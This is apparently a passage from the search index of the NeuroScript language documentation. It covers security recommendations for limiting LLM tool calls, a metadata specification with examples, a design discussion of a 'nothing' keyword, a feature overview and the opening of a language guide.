[cite: uploaded:neuroscript/pkg/core/tools_validation.go] or add further checks for arguments received from the LLM for tool calls. Pay extra attention to file paths, URLs, shell command arguments, etc. Check types, formats, and potentially value ranges or patterns.</li> <li>Path Sandboxing: Consistently use SecureFilePath [cite: uploaded:neuroscript/pkg/core/tools_helpers.go] (or equivalent) for all filesystem operations requested via TOOLs (ReadFile, WriteFile, ListDirectory, GitAdd, etc. [cite: uploaded:neuroscript/pkg/core/tools_fs.go, uploaded:neuroscript/pkg/core/tools_git.go]) to ensure they stay within the allowed working directory.</li> <li>Restrict/Disable Dangerous Tools: TOOL.ExecuteCommand [cite: uploaded:neuroscript/pkg/core/tools_shell.go] is high-risk. Consider:<ul> <li>Not exposing it to the LLM at all.</li> <li>If required, creating a highly restricted version that only allows specific commands from a hardcoded allowlist and performs extreme sanitization on arguments.</li> </ul> </li> <li>Resource Limits: Implement timeouts for LLM API calls and potentially for the execution of tools called by the LLM.</li> <li>Deny Direct NS Execution: The LLM should only be allowed to request registered TOOLs, not ask NeuroGo to execute arbitrary NeuroScript code strings it generates dynamically within the agent loop.</li> <li>Prompt Guidance (Secondary): Instructing the LLM about disallowed actions is helpful but not sufficient for security. Hardcoded checks and limitations in NeuroGo are essential.</li> </ul> </li> <li>Recommendation: Implement multiple layers: Tool allowlisting, strict validation, path sandboxing, and heavy restrictions (or disabling) of ExecuteCommand. Security needs careful design.</li> </ul>"},{"location":"metadata/","title":"Unified Metadata Specification for NeuroScript Projects","text":"<p>Status: DRAFT Version: 2.0.0 (2025-06-27)</p> <p>Abstract: This document defines a single, mandatory, and enforceable standard for metadata across all source files within the NeuroScript ecosystem. Its primary purpose is to ensure that metadata is unambiguously and reliably processable by computers, tooling, and automated agents. Adherence to these rules is not optional; they are a core part of the file format specifications. This standard applies to all related project files, including NeuroScript (.ns), Go (.go), NDCL (.nd*), Markdown (.md), and others.</p>"},{"location":"metadata/#1-metadata-line-format","title":"1. Metadata Line Format","text":"<p>All metadata is expressed as a simple key-value pair on a single line, intended for trivial parsing.</p> <ul> <li>Structure: ::key: value</li> <li>Prefix: Each metadata line must begin with the :: sigil.</li> <li>Key:<ul> <li>Must be camelCase. Parsers must treat keys as case-insensitive.</li> <li>Must match the character set [a-zA-Z0-9_.-]+.-   Separator: A single colon (:) must follow the key.</li> </ul> </li> <li>Value: The value is the remainder of the line. Parsers must trim leading and trailing whitespace from the value.</li> </ul>"},{"location":"metadata/#11-key-matching","title":"1.1 Key Matching","text":"<p>Matching: for the purposes of matching a key (i.e. finding it in a list of them) the case of the letters, and the characters underscore, dot and dash (<code>_.-</code>) are ignored. Both linters and parsers must report collisions. Thus a hypothetical function MetaKeyMatch(a,b) would return:</p> <p>| a | b | match? | | snakeMeta | SNAKEMETA | true | | snake.scope | snake_scope | true | | snakescope | snake____scope | true | | SNAKE_SCOPE | SNAKE#SCOPE | error | | SNAKE1SCOPE | SNAKE0SCOPE | false |</p>"},{"location":"metadata/#12-canonical-go-regex","title":"1.2 Canonical Go Regex","text":"<p>The following Go-compatible regular expression captures the key and value from a valid metadata line. Tooling should use this or an equivalent parser.</p> <p>go // Regex to capture the key (group 1) and value (group 2) from a metadata line. var metaRegex = regexp.MustCompile(<code>^::\\s*([a-zA-Z0-9_.-]+):\\s*(.*)$</code>) </p>"},{"location":"metadata/#3-placement","title":"3. Placement","text":"<p>The placement of metadata blocks is mandatory and not a guideline. This ensures that automated tools can locate metadata without ambiguity.</p> <ol> <li>Default: absolute start of file, or before the block.</li> <li>Exception: ns functions: within the function</li> <li>Exception: Markdown (.md): File Footer: At the absolute end of the file (EOF). This prevents metadata from cluttering the rendered view of the document on platforms like GitHub, prioritizing human readability for prose-heavy files.</li> </ol>"},{"location":"metadata/#4-identity-keys-schema-serialization","title":"4. Identity Keys: schema &amp; serialization","text":"<p>Every file within the ecosystem must contain ::schema: and ::serialization: keys. These two keys form the fundamental identity of a file, telling any tool how to interpret its logical structure and its physical format.</p> <ul> <li>::schema:: Defines the logical grammar and vocabulary of the file's contents (e.g., neuroscript, ndcl, sdi-go, spec). </li> <li>::serialization:: Defines the physical file format that wraps the content (e.g., go, md, ns, txt). </li> </ul> <p>For example, a Go source file that contains special SDI directives has a logical schema of sdi-go but a physical serializationof go. A specification document like this one has a schema of spec and a serialization of md. </p>"},{"location":"metadata/#5-standard-vocabulary","title":"5.  Standard Vocabulary","text":"<p>To ensure consistency, all metadata must use keys from the standard vocabulary defined below. keys should be camelCase.  </p>"},{"location":"metadata/#51-file-scope","title":"5.1. File Scope","text":"<p>Placed in the file header or footer as per placement rules. </p> Key Purpose &amp; Rules schema Mandatory. Logical format (ndcl, spec, neuroscript, sdi-go). serialization Mandatory. Physical file format (md, txt, go, ns). langVersion The version of the interpreter or grammar required (e.g.,neuroscript@0.4.1). fileVersion A version for the file itself. Must be a monotonic integer. description A concise, one-line summary of the file's purpose. author The name of the human or agent responsible for the content. license An SPDX license identifier (e.g.,MIT, Apache-2.0) or the string \"Proprietary\". created The creation date of the file in ISO 8601 format (e.g.,2025-06-27 or 2025-06-27T15:58:00Z). modified The last modification date of the file in ISO 8601 format. tags Comma-separated words for indexing and search (e.g.,dataProcessing,io,experimental). type, subtype Domain-specific classification for categorization. dependsOn A comma-separated list of upstream source files this file logically depends on. howToUpdate Brief, essential instructions for future developers on maintaining this file."},{"location":"metadata/#52-block-procedure-section-chapter-scope","title":"5.2. Block, Procedure, Section, Chapter scope","text":"<p>Placed inside a function, method, or procedure block. </p> Key Purpose &amp; Rules description One-line summary of the procedure's function. purpose Multi-line explanation of the rationale behind the procedure. param: Description of a specific parameter. return: Description of a specific return value, identified by name or zero-based index. algorithm A multi-line, high-level description of the steps the procedure follows. exampleUsage A concrete code snippet demonstrating how to call the procedure. caveats Important limitations, edge cases, or \"gotchas\" to be aware of. requiresTool A comma-separated list of required external tools (e.g.,tool.compiler,tool.database). requiresLlm Boolean (true/false) indicating if the procedure depends on an LLM. timeout A duration string (e.g.,30s, 5m) specifying the expected execution timeout. pure Boolean (true/false) indicating if the function is pure (no side effects)."},{"location":"metadata/#53-inline-scope","title":"5.3. Inline Scope","text":"<p>Placed inline, immediately preceding a specific line or block of code.  | Key             | Purpose &amp; Rules                                                 | | --------------- | --------------------------------------------------------------- | | reason          | Explains why this specific step or line of code exists.       | | todo            | Note for a future improvement or feature to be added.           | | fixme           | Acknowledges a known bug or issue that needs to be fixed.       | | securityNote    | Highlights a potential security vulnerability or consideration. | | performanceNote | Comments on the performance implications of the code.           |</p>"},{"location":"metadata/#54-neurodata-block-scope","title":"5.4. NeuroData Block Scope","text":"<p>Placed inside a fenced code or data block, right after the opening fence. </p> Key Purpose &amp; Rules id A unique identifier for this specific block within the file or system. version A version string for the content of the block. type Explicitly declares the content type of the block (e.g.,json, sql, prompt). grammar Specifies the grammar and version required to parse the block's content."},{"location":"metadata/#55-standard-defining-files","title":"5.5 Standard-Defining Files","text":"<p>A file which defines a standard must contain at least the keys in this example (this file, in fact):</p> <p>:: name: NeuroData MetaData Standard :: standardID: ndinmeta :: standardName: NeuroData In-Situ Metadata :: standardVersion: 2.0.0 :: canonicalFileLocation: github.com/aprice2704/fdm/code/docs/metadata.md :: fileName: metadata.md :: schema: spec :: serialization: md :: fileVersion: 2 :: author: Andrew Price :: modified: 2025-06-27 :: howToUpdate: Update vocab or placement rules first, then bump file_version. :: dependsOn: none</p>"},{"location":"metadata/#sdi","title":"SDI","text":"<p>SDI keys may be added to any meta block</p> <p><code>:: sdiSpec: &lt;specID&gt;</code> in the file header, declares that this file is associated with a named specification <code>:: sdiDesign &lt;designElementID,...&gt;</code> Documents the parts of the Design this scope is part of <code>:: sdiImpl &lt;implElementID,...&gt;</code> Documents the parts of the implementation plan this scope is part of</p>"},{"location":"metadata/#56-go-source-file-scope-with-sdi","title":"5.6. Go Source File Scope with SDI","text":"<p>For Go files with a ::schema: sdi-go, special sdi:prefixed comments are used to declare architectural design and implementation details. </p> <p><code>// :: sdiSpec: &lt;specID&gt;</code> in the file header, declares that this file is associated with a named specification <code>// :: sdiDesign &lt;designElementID,...&gt;</code> Above a type or func documents the parts of the Design this function is part of</p>"},{"location":"metadata/#7-examples","title":"7. Examples","text":""},{"location":"metadata/#71-neuroscript-example","title":"7.1. NeuroScript Example","text":"<pre><code>::schema: neuroscript \n::serialization: ns \n::langVersion: neuroscript@0.2.0 \n::fileVersion: 1.1.0 \n::author: Alice Price \n::created: 2025-04-30 \n::license: MIT \n::description: Example script demonstrating metadata placement. \n::tags: example,metadata \nfunc ProcessData(needs inputData, optional threshold returns processedCount, errorMsg) means \n  ::purpose: Processes input data according to a threshold. This is a multi-line field to explain the rationale in depth. \n  ::param:inputData: The raw data list to process. \n  ::param:threshold: Optional numeric threshold for filtering. \n  ::return:processedCount: Number of items successfully processed. \n  ::return:errorMsg: Any error message encountered, or \"\" on success. \n  ::algorithm: \n  ::  1. Initialize counters. \n  ::  2. Iterate through inputData. \n  ::  3. Apply threshold filter if provided. \n  ::  4. Increment counter. \n  ::  5. Return count and empty error string. \n  ::caveats: Does not handle non-numeric data gracefully yet. \n  ::requiresLlm: false \n  set count = 0 \n  set err = \"\" \n  # Iterate and process \n  for each item in inputData \n    ::reason: This is the main processing loop for the function. \n    # ... processing logic ... \n    set count = count + 1 \n  endfor \n  return count, err \nendfunc \n</code></pre>"},{"location":"metadata/#72-go-sdi-example","title":"7.2. Go + SDI Example","text":""},{"location":"metadata/#package-memorystore-persists-fractal-detail-memories-schema-sdi-go-serialization-go-fileversion-030-langversion-neuroscript041-description-core-snapshot-store-with-time-travel-telemetry-author-andrew-price-license-mit-sdi_spec-memorystore-contract-valuewrapping-sdidesign-the-store-uses-an-immutable-content-addressed-blobtree-model-package-memorystore-import-cryptosha256-store-is-the-main-object-for-memory-persistence-type-store-struct-fields-sdiimpl-memorystore-sdidesign-each-write-creates-a-new-root-commit-pointing-to-a-tree-of-content-addressed-chunks-func-s-store-putdata-byte-32byte-error-performancenote-sha256-was-chosen-over-faster-hashes-for-content-integrity-h-sha256sum256data-implementation-logic-return-h-nil","title":"<pre><code>// Package memorystore persists fractal detail memories. \n// \n// ::schema: sdi-go \n// ::serialization: go \n// ::fileVersion: 0.3.0 \n// ::langVersion: neuroscript@0.4.1 \n// ::description: Core snapshot store with time-travel telemetry. \n// ::author: Andrew Price \n// ::license: MIT \n// ::sdi_spec: memoryStore \n// ::contract: valueWrapping \n// sdi:design The store uses an immutable, content-addressed blob+tree model. \npackage memorystore \nimport \"crypto/sha256\" \n// Store is the main object for memory persistence. \ntype Store struct { \n  // ... fields \n} \n\n// sdi:impl memoryStore \n// sdi:design Each write creates a new root commit pointing to a tree of content-addressed chunks. \nfunc (s *Store) Put(data []byte) ([32]byte, error) { \n    // ::performanceNote: SHA256 was chosen over faster hashes for content integrity. \n    h := sha256.Sum256(data) \n    // ... implementation logic ... \n    return h, nil \n} \n</code></pre>","text":""},{"location":"metadata/#8-7-tooling-ci-enforcement","title":"8. 7. Tooling &amp; CI Enforcement","text":"<p>Adherence to this specification must be enforced via automated tooling and Continuous Integration (CI) checks. Linters and pre-commit hooks should be configured to perform the following validations: </p> <ul> <li>Presence Check: Fail if any file is missing the mandatory::schema: or ::serialization:keys. </li> <li>Format Check: Fail if any metadata line does not conform to the::key: valueformat and regex. </li> <li>Placement Check: Fail if file-level metadata is not in the correct location (header/footer) for itsserializationtype. </li> <li>Vocabulary Check: Warn on any metadata keys that are not part of the standard vocabulary. -   Date Format Check: Fail if::created:or::modified:values are not valid ISO 8601 dates.</li> <li>Version Check: Fail a build if a::fileVersion:is not greater than the version in the main branch (to prevent regressions). </li> <li>SDI Link Check (for Go): Fail if a file contains// sdi:impl <code>specID</code> but no corresponding::sdi_spec: </li> </ul> <p>:: name: NeuroData MetaData Standard :: standardID: ndinmeta :: standardName: NeuroData In-Situ Metadata :: standardVersion: 2.0.0 :: canonicalFileLocation: github.com/aprice2704/fdm/code/docs/metadata.md :: fileName: metadata.md :: schema: spec :: serialization: md :: fileVersion: 2 :: author: Andrew Price :: modified: 2025-06-27 :: howToUpdate: Update vocab or placement rules first, then bump file_version. :: dependsOn: none</p>"},{"location":"metadata_golang/","title":"Metadata golang","text":"<p>### Embedding NeuroScript-style Metadata + SDI in Go  (compact, compiler-safe, godoc-friendly)</p> <p>#### 1\u2003Syntax snapshot</p> <p>`go  // Package foo provides \u2026  //  // :: file_version: 1.2.0  // :: lang_version: neuroscript@0.4.1  // :: description: Foo-bar bridge to NeuroScript tools  // :: sdi_spec:   bridge            // \u2190 ID in docs/spec/bridge.md  // :: contract:   value_wrapping  //  // sdi:design single chokepoint unwrap-coerce-wrap  package foo  </p> <p>// sdi:impl bridge  func (r Registry) CallFromInterpreter(/ \u2026 */) { \u2026 }  `</p> <p>#### 2\u2003Directive grammar</p> Form Scope Example <code>// :: key: value</code> File-level metadata <code>// :: tags: bridge, llm</code> <code>// sdi:design &lt;text&gt;</code> Immediately before pkg/function <code>// sdi:design pure functional tokenizer</code> <code>// sdi:impl &lt;specID&gt;</code> On every exported type/func <code>// sdi:impl bridge</code> <p>(all are plain <code>//</code> comments \u21d2 ignored by compiler, shown by godoc)</p> <p>#### 3\u2003Placement guide</p> <p>* Top-of-file doc comment \u2192 all <code>::</code> keys plus optional overall <code>sdi:design</code>.  * Above exported APIs      \u2192 <code>sdi:design</code> + mandatory <code>sdi:impl &lt;specID&gt;</code>.  * Private helpers          \u2192 tag only if they realise a distinct spec.</p> <p>#### 4\u2003Contracts</p> <p><code>go    // :: contract: value_wrapping    // :: contract_ref: docs/spec/value_wrapping.md</code></p> <p>CI can verify the markdown file exists; IDE or LLM can jump to it.</p> <p>#### 5\u2003Tooling sketch (\u226450 LOC)</p> <p>* grep / parser: <code>grep -nE '^// (::|sdi:)'</code> for quick scans.  * vet rule: every <code>sdi:impl X</code> must match some <code>:: sdi_spec: X</code>.  * fail CI if a <code>contract:</code> path is missing.</p> <p>#### 6\u2003Minimal working example</p> <p>`go  // Package memorystore persists fractal detail memories.  //  // :: file_version: 0.3.0  // :: lang_version: neuroscript@0.4.1  // :: description: Core snapshot store with time-travel telemetry  // :: author: Andrew Price  // :: license: MIT  // :: sdi_spec:   memory_store  // :: contract:   value_wrapping  //  // sdi:design immutable, content-addressed blob+tree model  package memorystore  </p> <p>import \"crypto/sha256\"  </p> <p>// sdi:impl memory_store  // sdi:design root commit points to tree of chunks; each write creates a new root.  func (s *Store) Put(data []byte) (hash [32]byte, err error) {      h := sha256.Sum256(data)      // \u2026      return h, nil  }  `</p> <p>Bottom-line: use <code>// :: key: value</code> for file metadata + <code>sdi:</code> inline tags for SDI.  It\u2019s compact, compiler-silent, godoc-visible, and machine-parseable for humans and AIs alike.</p>"},{"location":"neurodata_and_composite_file_spec/","title":"NeuroData and Composite Files","text":"<p>NeuroData may appear without code fences by itself in a file, or may appear as code-fenced blocks within a file containing many such blocks -- such a file is called a \"composite file\" and is generally markdown with embedded NeuroData.</p>"},{"location":"neurodata_and_composite_file_spec/#metadata","title":"Metadata","text":"<p>All NeuroData and NeuroScript files and blocks should have metadata.</p> <p>Prefix: Metadata lines must start with :: (colon, colon, followed by at least one space). Optional whitespace is allowed before the ::.</p> <p>Structure: The line follows a key: value pattern after the :: prefix. Key: The key comes immediately after the :: prefix (and before the colon). Based on the regex used ([a-zA-Z0-9_.-]+), keys can contain letters, numbers, underscores, periods, and hyphens. </p> <p>Whitespace immediately around the key (but after the required space following ::) is tolerated.</p> <p>Separator: A colon (:) separates the key from the value. Whitespace around the colon is tolerated.</p> <p>Value: The value consists of everything following the first colon on the line, with leading/trailing whitespace trimmed from the value itself.</p> <p>Location: All metadata lines must appear at the beginning of the file, before any checklist item lines (lines starting with - [ ] or - [x]). Metadata lines cannot be interspersed with checklist items.</p> <p>Comments: Regular comment lines (starting with #, potentially indented) are ignored and can appear before, after, or between metadata lines (but still before the first checklist item). Example:</p> <pre><code>:: id: project-alpha\n:: version : 1.2.0   # This is a standard comment, ignored by parser\n:: requires-review : true\n\n# Another standard comment\n\n- [ ] First item...\n</code></pre>"},{"location":"nothing_disc/","title":"Nothing disc","text":"<p>Ah yes \u2014 that changes the shape of things nicely.</p> <p>Let\u2019s work from your clarified ground:</p> <ul> <li>NeuroScript is dynamically typed.</li> <li>You don\u2019t have structs, only maps.</li> <li>You already use <code>no</code> and <code>some</code> to detect list/map emptiness.</li> <li>You want to ban nil entirely.</li> <li>You\u2019re asking: can we define a <code>nothing</code> keyword that is just an empty list \u2014 and use it to express \u201cabsence\u201d wherever needed?</li> </ul>"},{"location":"nothing_disc/#yes-a-nothing-keyword-as-an-empty-list-is-workable-and-consistent-with-your-model","title":"\u2705 Yes, a <code>nothing</code> keyword as an empty list is workable and consistent with your model.","text":"<p>But it has trade-offs you\u2019ll want to understand.</p>"},{"location":"nothing_disc/#semantics-of-nothing","title":"\ud83d\udd0d Semantics of <code>nothing</code> = <code>[]</code>","text":""},{"location":"nothing_disc/#youd-define","title":"You\u2019d define:","text":"<pre><code>nothing := []\n</code></pre> <p>Or ideally as a keyword:</p> <pre><code>nothing  \u2259  []\n</code></pre> <p>And allow it to be used:</p> <ul> <li>as a return value from functions that would otherwise return <code>nil</code>,</li> <li>as a sentinel to mean \u201cno value\u201d,</li> <li>in maps, as a field value or lookup result.</li> </ul>"},{"location":"nothing_disc/#advantages","title":"\u2705 Advantages","text":"<ul> <li>Simple, consistent: no need to invent <code>Option</code>, union types, or tag structures.</li> <li>Already covered by <code>no</code>: <code>no x</code> works exactly as expected on <code>nothing</code>.</li> <li>Zero implementation cost: no special type system features required.</li> </ul>"},{"location":"nothing_disc/#caveats","title":"\u26a0\ufe0f Caveats","text":"<p>Here\u2019s where you need discipline:</p>"},{"location":"nothing_disc/#1-no-type-distinction-between-nothing-and-empty-list","title":"1. No type distinction between \"nothing\" and empty list","text":"<p>You can't distinguish:</p> <pre><code>x := []     # nothing\ny := []     # actual list (e.g. user ids)\n</code></pre> <p>So a function that might return:</p> <pre><code>return []  # means \"nothing found\"\n</code></pre> <p>\u2026will be indistinguishable from \u201cfound an empty list\u201d.</p> <p>This might be fine \u2014 if you commit to treating empty = absent semantically.</p> <p>But it makes some edge cases tricky:</p> <pre><code>func getUserGroups(user) -&gt; [] {\n    if user not found {\n        return nothing\n    }\n    return []\n}\n</code></pre> <p>How do you tell \u201cuser exists but has no groups\u201d from \u201cuser not found\u201d? You can\u2019t \u2014 not without richer tagging.</p>"},{"location":"nothing_disc/#2-cant-use-nothing-to-represent-empty-maps","title":"2. Can\u2019t use <code>nothing</code> to represent empty maps","text":"<p>If <code>nothing := []</code>, then it is not an empty map <code>{}</code> \u2014 and in a dynamically typed language, that distinction matters.</p> <p>E.g., you might have:</p> <pre><code>if no mymap[\"key\"] {\n   # means either key absent, or value is [], or value is {}\n}\n</code></pre> <p>The lack of type guards can leak ambiguity unless you encode intention explicitly.</p>"},{"location":"nothing_disc/#recommendation","title":"\ud83e\udde0 Recommendation","text":"<p>You can absolutely use <code>nothing := []</code> as a first-class sentinel. Just add two conventions:</p>"},{"location":"nothing_disc/#1-semantic-rule","title":"1. Semantic Rule:","text":"<p><code>nothing</code> means \u201cno meaningful value\u201d. It is treated the same as <code>no</code> \u2014 and should never be confused with an actual list you intend to process.</p> <p>Make this an invariant and document it in the standard library spec.</p>"},{"location":"nothing_disc/#2-tag-where-needed","title":"2. Tag where needed","text":"<p>In rare cases where you must distinguish empty-from-absent:</p> <pre><code>return { status: \"none\" }\nreturn { status: \"ok\", result: [] }\n</code></pre> <p>This gives you explicit disambiguation without needing types.</p>"},{"location":"nothing_disc/#bottom-line","title":"\ud83d\udccc Bottom Line","text":"<p>\u2714 Yes, you can define a <code>nothing</code> keyword as an empty list (<code>[]</code>). \u2714 It aligns with your <code>no</code>/<code>some</code> machinery and avoids <code>nil</code>. \u26a0 Just be aware: <code>[]</code> is not a truly unique sentinel. It works only because you\u2019re enforcing semantic discipline, not type-level guarantees.</p> <p>Would you like help writing a short <code>nothing.ns</code> definition block and some standard library guidance around its use?</p>"},{"location":"ns_features/","title":"Ns features","text":""},{"location":"ns_features/#neuroscript-your-ai-native-event-savvy-scripting-layer","title":"NeuroScript \u2014 Your AI-native, event-savvy scripting layer","text":"<p>Hand-optimised for humans, Go code, and large language models.</p>"},{"location":"ns_features/#1-why-neuroscript","title":"1. Why NeuroScript?","text":"Challenge How NeuroScript helps Hidden prompt spaghetti Step-by-step procedures that read like code yet double as chain-of-thought. Uncaught runtime surprises Hardened <code>must</code> / <code>on_error</code> model keeps failures loud and contained . Glue code scattered across tools One language to script AI calls, file I/O, JSON, DBs, HTTP\u2026 anything you register as a <code>tool.*</code>. Evolving requirements Metadata lines (<code>:: key: value</code>) make every file self-describing and versioned for painless diffing and search . Reactive automation First-class events and top-level <code>on event ... endevent</code> handlers let scripts wake up on \u201cfile_uploaded\u201d, \u201cmodel_done\u201d, etc., without polling ."},{"location":"ns_features/#2-flagship-capabilities","title":"2. Flagship capabilities","text":""},{"location":"ns_features/#event-driven-hooks","title":"\u2022 Event-driven hooks","text":"<p>Define global handlers once and forget cron jobs:</p> <pre><code>on event UserSignedUp(payload) means\n  set welcome = \"Hi \" + payload[\"name\"] + \"!\"\n  call tool.Email.Send(payload[\"email\"], welcome)\nendevent\n</code></pre> <p>The runtime queues incoming <code>event</code> values (name, timestamp, payload) and dispatches them transactionally.</p>"},{"location":"ns_features/#industrial-grade-error-handling","title":"\u2022 Industrial-grade error handling","text":"<ul> <li><code>must expr</code> turns any falsy check or <code>error</code> map into a panic caught by the nearest <code>on_error</code> block.</li> <li><code>fail \"msg\"</code> aborts intentionally.</li> <li><code>clear_error</code> lets you recover and continue .</li> </ul>"},{"location":"ns_features/#multi-return-destructuring","title":"\u2022 Multi-return &amp; destructuring","text":"<p>Procedures can return many values without tuple boiler-plate:</p> <pre><code>set sum, prod = Math.AddMul(needs 3, 5)\n</code></pre> <p>Callers get an ordered list, tests stay simple .</p>"},{"location":"ns_features/#rich-explicit-types","title":"\u2022 Rich, explicit types","text":"<p>Beyond the obvious (<code>string</code>, <code>number</code>, <code>list</code>, <code>map</code>) you get:</p> <ul> <li><code>error</code> \u2013 standard structured error maps.</li> <li><code>timedate</code> \u2013 wraps <code>time.Time</code>.</li> <li><code>event</code> \u2013 runtime signals.</li> <li><code>fuzzy</code> \u2013 0-1 truth values with min/max logic .</li> </ul>"},{"location":"ns_features/#built-in-ai-verb","title":"\u2022 Built-in AI verb","text":"<p>Send prompts directly from code:</p> <pre><code>ask \"Summarise: \" + doc into summary\n</code></pre> <p><code>summary</code> is plain text; the last LLM reply is always in <code>last</code> for quick chaining .</p>"},{"location":"ns_features/#3-developer-ergonomics-youll-feel-day-one","title":"3. Developer ergonomics you\u2019ll feel day one","text":"<ul> <li>Single-file onboarding \u2013 paste a <code>.ns</code> file, run it; no build step.</li> <li>Go-first interop \u2013 register a Go function once; adapters unwrap primitives for you.</li> <li>Readable diffs \u2013 metadata up top, business logic below.</li> <li>Searchable knowledge base \u2013 every procedure is a discoverable \u201cskill\u201d for humans and agents.</li> <li>Zero-ceremony concurrency \u2013 event handlers run in isolation; state stays per-event.</li> </ul>"},{"location":"ns_features/#4-under-the-hood","title":"4. Under the hood","text":"<pre><code>Interpreter (core.Value wrappers)\n         \u2502\n         \u25bc\n   Adapter layer\n   \u251c\u2500\u2500 Built-ins   (sin, typeof\u2026)\n   \u251c\u2500\u2500 Tools       (your Go functions)\n   \u2514\u2500\u2500 Event bus   (enqueue / dispatch)\n</code></pre> <p>A strict wrapper \u2194 primitive boundary keeps core deterministic while letting tools live in idiomatic Go.</p>"},{"location":"ns_features/#5-ready-to-try","title":"5. Ready to try?","text":"<ol> <li>Install the Go package <code>github.com/aprice2704/neuroscript</code>.</li> <li>Register a tool:</li> </ol> <pre><code>ns.Register(\"FS.Read\", func(path string) (string, error) { \u2026 })\n</code></pre> <ol> <li>Drop a <code>.ns</code> file in your project and call <code>Interp.Run(\"file.ns\")</code>.</li> </ol> <p>That\u2019s it\u2014you\u2019ve added an event-aware, AI-native automation layer without sacrificing type safety or your debugging sanity.</p> <p>Write procedures like comments, run them like code.</p>"},{"location":"ns_full_guide/","title":"A Comprehensive Guide to NeuroScript","text":""},{"location":"ns_full_guide/#1-introduction-to-neuroscript","title":"1. Introduction to NeuroScript","text":"<ul> <li>1.1. What is NeuroScript?</li> <li>1.2. Key Language Philosophies</li> <li>1.3. Your First NeuroScript File: A \"Hello, World\" Example</li> </ul>"},{"location":"ns_full_guide/#2-lexical-structure-core-syntax","title":"2. Lexical Structure &amp; Core Syntax","text":"<ul> <li>2.1. Comments</li> <li>2.2. Whitespace, Newlines, and Line Continuations</li> <li>2.3. Identifiers</li> <li>2.4. Keywords</li> <li>2.5. File Header and Metadata</li> </ul>"},{"location":"ns_full_guide/#3-data-types-and-literals","title":"3. Data Types and Literals","text":"<ul> <li>3.1. Overview of NeuroScript's Dynamic Types</li> <li>3.2. Primitive Types</li> <li>3.3. Composite Types</li> <li>3.4. Special-Purpose Types</li> </ul>"},{"location":"ns_full_guide/#4-variables-state-and-expressions","title":"4. Variables, State, and Expressions","text":"<ul> <li>4.1. Variable Scope and Lifetime</li> <li>4.2. L-Values: The Targets of Assignment</li> <li>4.3. Assigning State with the <code>set</code> Statement</li> <li>4.4. Placeholders for String Interpolation</li> <li>4.5. Operator Precedence</li> <li>4.6. Detailed Operator Guide</li> </ul>"},{"location":"ns_full_guide/#5-fundamental-statements","title":"5. Fundamental Statements","text":"<ul> <li>5.1. The <code>must</code> Statement: Asserting Truth</li> <li>5.2. The <code>call</code> Statement: Invoking Functions and Tools</li> <li>5.3. The <code>ask</code> Statement: Prompting for Input</li> <li>5.4. The <code>emit</code> Statement: Firing Events</li> <li>5.5. The <code>fail</code> Statement: Halting with an Error</li> <li>5.6. State Clearing Statements</li> </ul>"},{"location":"ns_full_guide/#6-control-flow-structures","title":"6. Control Flow Structures","text":"<ul> <li>6.1. Conditional Logic: <code>if</code>/<code>else</code>/<code>endif</code></li> <li>6.2. Looping</li> <li>6.3. Modifying Loop Behavior: <code>break</code> and <code>continue</code></li> <li>6.4. Limitations</li> </ul>"},{"location":"ns_full_guide/#7-scripting-models","title":"7. Scripting Models","text":"<ul> <li>7.1. Command Scripts: The Top-Level Execution Block</li> <li>7.2. Library Scripts</li> </ul>"},{"location":"ns_full_guide/#8-procedures-tools-and-calls","title":"8. Procedures, Tools, and Calls","text":"<ul> <li>8.1. Defining a Function (<code>func</code>)</li> <li>8.2. Defining a Signature</li> <li>8.3. The <code>return</code> Statement</li> <li>8.4. <code>callable_expr</code>: How Functions are Called</li> <li>8.5. Built-in Functions</li> <li>8.6. External Logic: The <code>tool</code> Keyword</li> </ul>"},{"location":"ns_full_guide/#9-event-and-error-handling","title":"9. Event and Error Handling","text":"<ul> <li>9.1. The Event Model</li> <li>9.2. The Error Model</li> </ul>"},{"location":"ns_full_guide/#10-advanced-operators-and-reserved-keywords","title":"10. Advanced Operators and Reserved Keywords","text":"<ul> <li>10.1. Type Introspection with <code>typeof</code></li> <li>10.2. The <code>some</code> and <code>no</code> Operators</li> <li>10.3. Reserved Keywords for Future Use</li> </ul>"},{"location":"ns_full_guide/#1-introduction-to-neuroscript_1","title":"1. Introduction to NeuroScript","text":"<p>Welcome to NeuroScript, a language designed from the ground up to be a clear, expressive, and powerful bridge between human developers and artificial intelligence. It provides a shared, structured medium for defining tasks, logic, and data in a way that is both human-readable and machine-executable.</p> <p>NeuroScript (ns) is not designed to be: subtle, refined, highly-expressive, elegant, rich, strongly-typed, particularly fast, or enjoyable for human developers to write. We expect that most ns will be written by AIs.</p>"},{"location":"ns_full_guide/#11-what-is-neuroscript","title":"1.1. What is NeuroScript?","text":"<p>At its core, NeuroScript is a high-level, statement-driven scripting language. Its primary purpose is to orchestrate complex workflows, manage state, and interact with external systems, or \"tools\".</p> <p>Think of it as a set of precise instructions that can be written by an AI, understood by a person, and executed by a computer or AI. This makes it ideal for:</p> <ul> <li>Automating complex tasks: Define multi-step processes that involve logic, data manipulation, and calls to external APIs or functions.</li> <li>AI and Agentic Workflows: Provide a clear, unambiguous language for AI agents to understand goals, execute tasks, and report results.</li> <li>Configuration and Logic Definition: Create readable and maintainable files that define behavior for systems and applications.</li> </ul>"},{"location":"ns_full_guide/#12-key-language-philosophies","title":"1.2. Key Language Philosophies","text":"<p>NeuroScript's design is guided by a few core principles that make it robust and easy to use.</p>"},{"location":"ns_full_guide/#121-explicit-statement-driven-logic","title":"1.2.1. Explicit Statement-Driven Logic","text":"<p>Every action in NeuroScript is initiated by an explicit keyword statement (like <code>set</code>, <code>call</code>, <code>emit</code>, or <code>if</code>). There are no \"bare\" expressions that execute on their own. This design choice eliminates ambiguity and makes the code's intent incredibly clear. You always know what action a line of code is intended to perform.</p> <pre><code># This is a statement. It explicitly assigns a value.\nset my_variable = \"hello\"\n\n# This is also a statement. It explicitly calls a function.\ncall tool.print(my_variable)\n\n# This would be an error. An expression alone does nothing.\n# \"hello\" \n</code></pre>"},{"location":"ns_full_guide/#122-dual-scripting-models","title":"1.2.2. Dual Scripting Models","text":"<p>NeuroScript files can operate in one of two primary modes, allowing you to either define reusable logic or execute an immediate task.</p> <ol> <li>Library Scripts: These files act as collections of reusable procedures (<code>func</code>) and event handlers (<code>on event</code>). They are designed to be loaded by other scripts or an execution engine to provide a library of functions and behaviors.</li> <li>Command Scripts: These files define a single, top-level <code>command</code> block that is executed immediately. This is useful for one-off tasks or for serving as the main entry point of a program.</li> </ol> <p>A script can contain either library blocks or command blocks, but not both.</p>"},{"location":"ns_full_guide/#123-metadata-rich-files","title":"1.2.3. Metadata-Rich Files","text":"<p>NeuroScript encourages the embedding of metadata 